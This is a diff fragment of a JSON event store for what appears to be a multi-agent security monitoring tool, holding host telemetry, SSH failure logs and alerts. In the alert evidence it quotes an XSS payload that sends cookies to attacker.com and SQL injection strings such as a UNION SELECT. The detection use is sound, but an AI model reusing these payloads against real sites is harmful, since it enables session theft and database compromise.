+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2564,\"cpuCount\":2,\"cpuUsagePercent\":1.2,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371282432,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57214176,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.2%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 1.2,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 55,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:24.615Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "1b6db1922ffafd8b94bf28994736699b881c6d3c43c22eb16055d0d61f544ffa",
+      "createdAt": "2026-09-17T17:26:24.615Z"
+    },
+    {
+      "id": "SYS-1789665980614-4aafb5",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2560,\"cpuCount\":2,\"cpuUsagePercent\":0.2,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371851776,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":57019992,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.2%, Memory 21.5% (3216MB free).",
+        "features": {
+          "cpuUsage": 0.2,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:20.614Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "6ddb82b95516e663794f0e8f2aecd56eb7b5915d1961d977ba269a61642a0eb4",
+      "createdAt": "2026-09-17T17:26:20.614Z"
+    },
+    {
+      "id": "SYS-1789665976613-33520b",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2556,\"cpuCount\":2,\"cpuUsagePercent\":31.9,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3371077632,\"usedMemoryPercent\":21.5,\"processCount\":1,\"heapUsedBytes\":56812832,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 31.9%, Memory 21.5% (3215MB free).",
+        "features": {
+          "cpuUsage": 31.9,
+          "memoryUsage": 21.5,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:16.613Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "619e13e515e5da0bf8c01314224413d4a67551753055cd396649e6a12ee1cdad",
+      "createdAt": "2026-09-17T17:26:16.614Z"
+    },
+    {
+      "id": "SYS-1789665972614-c09b99",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2552,\"cpuCount\":2,\"cpuUsagePercent\":27.6,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3299901440,\"usedMemoryPercent\":23.2,\"processCount\":1,\"heapUsedBytes\":56860432,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 27.6%, Memory 23.2% (3147MB free).",
+        "features": {
+          "cpuUsage": 27.6,
+          "memoryUsage": 23.2,
+          "loadAvg1m": 0,
+          "heapUsedMb": 54,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:12.614Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "40e281eedcd7558a10332c84a6c6c565b1d4c1e2d10f6fd9cba4cf0015506343",
+      "createdAt": "2026-09-17T17:26:12.614Z"
+    },
+    {
+      "id": "SYS-1789665968613-03c496",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2548,\"cpuCount\":2,\"cpuUsagePercent\":2.6,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3179077632,\"usedMemoryPercent\":26,\"processCount\":1,\"heapUsedBytes\":209143848,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 2.6%, Memory 26% (3032MB free).",
+        "features": {
+          "cpuUsage": 2.6,
+          "memoryUsage": 26,
+          "loadAvg1m": 0,
+          "heapUsedMb": 199,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:08.613Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "591f1b2127367681106501d099cb9ab0a12cb5fa1e542cc47e4720813044b5ec",
+      "createdAt": "2026-09-17T17:26:08.613Z"
+    },
+    {
+      "id": "SYS-1789665964612-e3fd16",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2544,\"cpuCount\":2,\"cpuUsagePercent\":16.6,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3179298816,\"usedMemoryPercent\":26,\"processCount\":1,\"heapUsedBytes\":208939840,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 16.6%, Memory 26% (3032MB free).",
+        "features": {
+          "cpuUsage": 16.6,
+          "memoryUsage": 26,
+          "loadAvg1m": 0,
+          "heapUsedMb": 199,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:04.612Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "a7d674b5892876160f78081080e0bcffbbc8f8e4e08154c7bcdd6ffa9981f1ca",
+      "createdAt": "2026-09-17T17:26:04.612Z"
+    },
+    {
+      "id": "EXT-1789665961869-0648",
+      "source": "system",
+      "eventType": "External Telemetry Ingest",
+      "rawPayload": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+      "normalizedFields": {
+        "host": "external-host",
+        "severity": "LOW",
+        "details": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+        "features": {},
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:26:01.869Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "external-host",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "4bef7790edd745ec352b8d2f49aa60baa6a42af35880d950be69d5ec8b2a9ec1",
+      "createdAt": "2026-09-17T17:26:01.869Z"
+    },
+    {
+      "id": "SYS-1789665960611-234f46",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2540,\"cpuCount\":2,\"cpuUsagePercent\":1.1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3180986368,\"usedMemoryPercent\":25.9,\"processCount\":1,\"heapUsedBytes\":216119584,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.1%, Memory 25.9% (3034MB free).",
+        "features": {
+          "cpuUsage": 1.1,
+          "memoryUsage": 25.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 206,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:26:00.611Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "1832a1e07c8d6da62a4d3ed4e6dc02d0bc1913848fdd916d1898437cac65fa05",
+      "createdAt": "2026-09-17T17:26:00.611Z"
+    },
+    {
+      "id": "SYS-1789665956610-7f7c47",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2536,\"cpuCount\":2,\"cpuUsagePercent\":0.6,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3181477888,\"usedMemoryPercent\":25.9,\"processCount\":1,\"heapUsedBytes\":215935560,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0.6%, Memory 25.9% (3034MB free).",
+        "features": {
+          "cpuUsage": 0.6,
+          "memoryUsage": 25.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 206,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:56.609Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "e7f1e69047af607e42127ce224a656592f9deabe01ce0fe06836aba436156110",
+      "createdAt": "2026-09-17T17:25:56.610Z"
+    },
+    {
+      "id": "SYS-1789665952609-5cbc6c",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2532,\"cpuCount\":2,\"cpuUsagePercent\":1.7,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3181654016,\"usedMemoryPercent\":25.9,\"processCount\":1,\"heapUsedBytes\":215747952,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.7%, Memory 25.9% (3034MB free).",
+        "features": {
+          "cpuUsage": 1.7,
+          "memoryUsage": 25.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 206,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:52.609Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "2f21a8086a7793132ea0b46d48c489d417bf1b6d6fc035b5700164d0f998e6b8",
+      "createdAt": "2026-09-17T17:25:52.609Z"
+    },
+    {
+      "id": "EXT-1789665950602-2cd8",
+      "source": "system",
+      "eventType": "External Telemetry Ingest",
+      "rawPayload": "Sep 17 10:20:00 sshd: failed",
+      "normalizedFields": {
+        "host": "external-host",
+        "severity": "LOW",
+        "details": "Sep 17 10:20:00 sshd: failed",
+        "features": {},
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:25:50.602Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "external-host",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "46dea72d751dbaf3fb8217b0df5f5f42c7701490010120466be2c1b8ff7e5bce",
+      "createdAt": "2026-09-17T17:25:50.602Z"
+    },
+    {
+      "id": "SYS-1789665948609-f6aea0",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2528,\"cpuCount\":2,\"cpuUsagePercent\":1,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3181838336,\"usedMemoryPercent\":25.9,\"processCount\":1,\"heapUsedBytes\":215344264,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1%, Memory 25.9% (3034MB free).",
+        "features": {
+          "cpuUsage": 1,
+          "memoryUsage": 25.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 205,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:48.609Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "593c0c838064c4d49b68f8412a72656604dc6eec561c9674f50b6f61331ab102",
+      "createdAt": "2026-09-17T17:25:48.609Z"
+    },
+    {
+      "id": "SYS-1789665944609-6c998b",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2524,\"cpuCount\":2,\"cpuUsagePercent\":1.9,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3174187008,\"usedMemoryPercent\":26.1,\"processCount\":1,\"heapUsedBytes\":215030480,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.9%, Memory 26.1% (3027MB free).",
+        "features": {
+          "cpuUsage": 1.9,
+          "memoryUsage": 26.1,
+          "loadAvg1m": 0,
+          "heapUsedMb": 205,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:44.608Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "45073c033fe2cd204b623fccf0d8e3606b5b222b6ea0733e4670aaa37d799579",
+      "createdAt": "2026-09-17T17:25:44.609Z"
+    },
+    {
+      "id": "SYS-1789665940608-c8c714",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2520,\"cpuCount\":2,\"cpuUsagePercent\":1.5,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3182080000,\"usedMemoryPercent\":25.9,\"processCount\":1,\"heapUsedBytes\":214829408,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 1.5%, Memory 25.9% (3035MB free).",
+        "features": {
+          "cpuUsage": 1.5,
+          "memoryUsage": 25.9,
+          "loadAvg1m": 0,
+          "heapUsedMb": 205,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:40.608Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "6eadfaf6d6f4fba4f5dd8ef56149688ab55121935490acae154d389090c4c61a",
+      "createdAt": "2026-09-17T17:25:40.608Z"
+    },
+    {
+      "id": "SYS-1789665936607-706695",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2516,\"cpuCount\":2,\"cpuUsagePercent\":2.4,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3176030208,\"usedMemoryPercent\":26.1,\"processCount\":1,\"heapUsedBytes\":214668920,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 2.4%, Memory 26.1% (3029MB free).",
+        "features": {
+          "cpuUsage": 2.4,
+          "memoryUsage": 26.1,
+          "loadAvg1m": 0,
+          "heapUsedMb": 205,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:36.607Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "eb89d554f94b7f94ed0baf5dbd048bf54a679029b06634c6ac448243e36648fb",
+      "createdAt": "2026-09-17T17:25:36.608Z"
+    },
+    {
+      "id": "EXT-1789665932608-16a6",
+      "source": "system",
+      "eventType": "External Telemetry Ingest",
+      "rawPayload": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+      "normalizedFields": {
+        "host": "external-host",
+        "severity": "LOW",
+        "details": "Sep 17 10:20:00 auth-node01 sshd[9999]: Failed password for invalid user admin from 192.0.2.45 port 51234 ssh2",
+        "features": {},
+        "isSimulated": false,
+        "telemetrySource": "EXTERNAL_AGENT"
+      },
+      "eventTimestamp": "2026-09-17T17:25:32.608Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "external-host",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "d4b0742c37f7c790c89605f6f962c50f504a55bf73120b28e2b4e4324b6c2902",
+      "createdAt": "2026-09-17T17:25:32.608Z"
+    },
+    {
+      "id": "SYS-1789665932603-e5aa6e",
+      "source": "system",
+      "eventType": "System Heartbeat Telemetry",
+      "rawPayload": "{\"hostname\":\"localhost\",\"platform\":\"linux\",\"arch\":\"x64\",\"uptimeSeconds\":2512,\"cpuCount\":2,\"cpuUsagePercent\":0,\"totalMemoryBytes\":4294967296,\"freeMemoryBytes\":3106963456,\"usedMemoryPercent\":27.7,\"processCount\":1,\"heapUsedBytes\":212336400,\"loadAverage\":[0,0,0]}",
+      "normalizedFields": {
+        "host": "localhost",
+        "severity": "LOW",
+        "details": "Host localhost telemetry: CPU 0%, Memory 27.7% (2963MB free).",
+        "features": {
+          "cpuUsage": 0,
+          "memoryUsage": 27.7,
+          "loadAvg1m": 0,
+          "heapUsedMb": 202,
+          "uptimeHours": 0.7
+        },
+        "isSimulated": false,
+        "telemetrySource": "HOST_SYSTEM"
+      },
+      "eventTimestamp": "2026-09-17T17:25:32.603Z",
+      "sourceIp": "127.0.0.1",
+      "destinationIp": "127.0.0.1",
+      "host": "localhost",
+      "username": "root",
+      "severity": "LOW",
+      "isTestEvent": false,
+      "contentHash": "ccdf3858e88b8cfd2054dce52d3782e4ded86be0fc10b592db0c1297b1ee8b35",
+      "createdAt": "2026-09-17T17:25:32.604Z"
+    },
+    {
       "source": "syslog",
       "eventType": "AUTH_FAILURE",
       "rawPayload": "Sep 17 09:30:15 gateway-fw sshd[28491]: Failed password for invalid user admin from 192.0.2.45 port 52318 ssh2",
@@ -98,6 +1262,1106 @@
   "correlations": [],
   "riskAssessments": [],
   "alerts": [
+    {
+      "alertId": "ALT-961857-9CWS",
+      "incidentId": "INC-20260917-EQGQF",
+      "title": "XSS_ATTACK",
+      "description": "Reflected XSS attempt <script>alert(\"XSS\")</script>",
+      "alertType": "XSS_ATTACK",
+      "severity": "CRITICAL",
+      "riskScore": 85,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>",
+        "Agent: ApplicationAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 85/100 with .)"
+      ],
+      "id": "ALT-1789665961858-x0eqa",
+      "createdAt": "2026-09-17T17:26:01.858Z"
+    },
+    {
+      "alertId": "ALT-961847-5Z4P",
+      "incidentId": "INC-20260917-SLJH8",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665961848-e48ds",
+      "createdAt": "2026-09-17T17:26:01.848Z"
+    },
+    {
+      "alertId": "ALT-961843-49QZ",
+      "incidentId": "INC-20260917-3DB51",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665961844-hfk2t",
+      "createdAt": "2026-09-17T17:26:01.844Z"
+    },
+    {
+      "alertId": "ALT-961839-Q4IL",
+      "incidentId": "INC-20260917-5ZB46",
+      "title": "PORT_SCAN",
+      "description": "Repeated port scan telemetry burst",
+      "alertType": "PORT_SCAN",
+      "severity": "MEDIUM",
+      "riskScore": 60,
+      "priority": "P3",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Agent: NetworkAgent",
+        "Detection Method: Multi-Agent Ensemble / Isolation Forest",
+        "Severity Rule: Anomalous Behavior & Port Reconnaissance (Assigned Medium severity under Anomalous Behavior & Port Reconnaissance: Risk score is 60/100. Factors: Reconnaissance / Anomaly pattern: PORT_SCAN.)"
+      ],
+      "id": "ALT-1789665961840-0uxh4",
+      "createdAt": "2026-09-17T17:26:01.840Z"
+    },
+    {
+      "title": "[SystemAgent] Brute Force Attack",
+      "description": "Multiple repeated authentication failures (4 failed attempts) from 203.0.113.50.",
+      "alertType": "Brute Force Attack",
+      "severity": "MEDIUM",
+      "riskScore": 85,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1110"
+      ],
+      "evidence": [
+        "4 failed SSH/auth attempts detected within sequence"
+      ],
+      "id": "ALT-18214378",
+      "alertId": "ALT-18214378",
+      "createdAt": "2026-09-17T17:26:01.821Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[NetworkAgent] Port Scanning",
+      "description": "Rapid port sweep detected across 5 destination ports from host 203.0.113.50.",
+      "alertType": "Port Scanning",
+      "severity": "HIGH",
+      "riskScore": 90,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1046"
+      ],
+      "evidence": [
+        "Scanned ports: 22, 80, 443, 3306, 5432"
+      ],
+      "id": "ALT-18203507",
+      "alertId": "ALT-18203507",
+      "createdAt": "2026-09-17T17:26:01.820Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] Suspicious URL Access",
+      "description": "Unauthorized probing of administrative endpoint.",
+      "alertType": "Suspicious URL Access",
+      "severity": "MEDIUM",
+      "riskScore": 70,
+      "priority": "P3",
+      "mitreTechniques": [
+        "T1595"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html"
+      ],
+      "id": "ALT-18197698",
+      "alertId": "ALT-18197698",
+      "createdAt": "2026-09-17T17:26:01.819Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[ApplicationAgent] SQL Injection",
+      "description": "SQL injection payload detected aiming at database enumeration or bypass.",
+      "alertType": "SQL Injection",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "mitreTechniques": [
+        "T1190"
+      ],
+      "evidence": [
+        "2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--"
+      ],
+      "id": "ALT-18185477",
+      "alertId": "ALT-18185477",
+      "createdAt": "2026-09-17T17:26:01.818Z",
+      "status": "NEW"
+    },
+    {
+      "title": "[SystemAgent] Privilege Escalation",
+      "description": "Administrative root shell acquired via sudo execution.",
+      "alertType": "Privilege Escalation",
+      "severity": "HIGH",
+      "riskScore": 92,
+      "priority": "P2",
+      "mitreTechniques": [
+        "T1548.003"
+      ],
+      "evidence": [
+        "Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "id": "ALT-18188257",
+      "alertId": "ALT-18188257",
+      "createdAt": "2026-09-17T17:26:01.818Z",
+      "status": "NEW"
+    },
+    {
+      "alertId": "ALT-961810-3BIE",
+      "incidentId": "INC-20260917-RO1HQ",
+      "title": "UDP Amplification Storm",
+      "description": "Bandwidth threshold exceeded: 1.2M pps from 198.51.100.111",
+      "alertType": "DDoS_FLOOD",
+      "severity": "CRITICAL",
+      "riskScore": 88,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Packet rate: 1.2M pps",
+        "Entropy: 0.98",
+        "Destination Port: 53",
+        "Agent: ThreatDetectionAgent",
+        "Detection Method: Isolation Forest Volumetric Anomaly",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 88/100 with .)"
+      ],
+      "id": "ALT-1789665961811-dcqee",
+      "createdAt": "2026-09-17T17:26:01.811Z"
+    },
+    {
+      "alertId": "ALT-961799-D02D",
+      "incidentId": "INC-20260917-9T43J",
+      "title": "Lateral Movement & Reconnaissance Sequence",
+      "description": "Correlated event sequence: Port Scan -> SSH Brute Force -> Web Exploit",
+      "alertType": "MULTI_STAGE_KILLCHAIN",
+      "severity": "CRITICAL",
+      "riskScore": 95,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Stage 1: Reconnaissance (NetworkAgent)",
+        "Stage 2: Initial Access (SystemAgent)",
+        "Stage 3: Persistence",
+        "Agent: CorrelationAgent",
+        "Detection Method: Multi-Agent Temporal Sliding Window",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 95/100 with Cross-Agent correlation active (NetworkAgent, SystemAgent, ApplicationAgent); Critical threat classification: MULTI_STAGE_KILLCHAIN.)"
+      ],
+      "id": "ALT-1789665961800-g3hvc",
+      "createdAt": "2026-09-17T17:26:01.800Z"
+    },
+    {
+      "alertId": "ALT-961795-4T7U",
+      "incidentId": "INC-20260917-SS4WB",
+      "title": "SQL Injection via Web Parameter",
+      "description": "SQL injection attempt in GET /api/products?id=1%20UNION%20SELECT",
+      "alertType": "SQL_INJECTION",
+      "severity": "CRITICAL",
+      "riskScore": 92,
+      "priority": "P1",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Pattern detected: UNION SELECT",
+        "HTTP 500 error triggered on downstream database",
+        "Agent: ApplicationAgent",
+        "Detection Method: Regex Signature & AST Anomaly Analyzer",
+        "Severity Rule: Multi-Stage Infiltration & Critical Compromise (Assigned Critical severity under Multi-Stage Infiltration & Critical Compromise: Risk score is 92/100 with Exploitation pattern detected: SQL_INJECTION.)"
+      ],
+      "id": "ALT-1789665961796-j4ob4",
+      "createdAt": "2026-09-17T17:26:01.796Z"
+    },
+    {
+      "alertId": "ALT-961791-5CN6",
+      "incidentId": "INC-20260917-CVP8V",
+      "title": "SSH Credential Brute Force",
+      "description": "Rapid failed authentication attempts exceeding 30 attempts per minute",
+      "alertType": "BRUTE_FORCE",
+      "severity": "HIGH",
+      "riskScore": 84,
+      "priority": "P2",
+      "status": "NEW",
+      "mitreTechniques": [],
+      "evidence": [
+        "Account: root, admin, test",
+        "34 failed password attempts in 45s",
+        "Agent: SystemAgent",
